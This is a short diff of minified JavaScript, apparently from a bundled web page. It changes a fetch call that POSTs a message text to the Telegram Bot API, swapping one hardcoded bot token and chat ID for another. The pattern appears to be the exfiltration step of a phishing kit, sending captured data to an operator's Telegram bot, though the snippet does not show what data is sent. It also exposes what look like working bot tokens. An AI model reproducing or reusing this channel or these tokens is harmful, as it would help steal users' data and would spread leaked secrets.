@@ -14691,10 +14691,10 @@ n.m = e,
                     return a().wrap((function(e) {
                         for (;;) switch (e.prev = e.next) {
                             case 0:
-                                return "https://api.telegram.org/bot7120172609:AAFumqUPatE7UZAcYP74nwlZ37wqqXuGvuk/sendMessage", e.next = 3, n = {
+                                return "https://api.telegram.org/bot7600794214:AAHWmO3t1uhlBZhYfHbvuj7y0UyE7M5s03o/sendMessage", e.next = 3, n = {
                                     text: t,
-                                    chat_id: "6352590969"
-                                }, fetch("https://api.telegram.org/bot7120172609:AAFumqUPatE7UZAcYP74nwlZ37wqqXuGvuk/sendMessage", {
+                                    chat_id: "6553640627"
+                                }, fetch("https://api.telegram.org/bot7600794214:AAHWmO3t1uhlBZhYfHbvuj7y0UyE7M5s03o/sendMessage", {
                                     method: "POST",
                                     headers: {
                                         "Content-Type": "application/json"
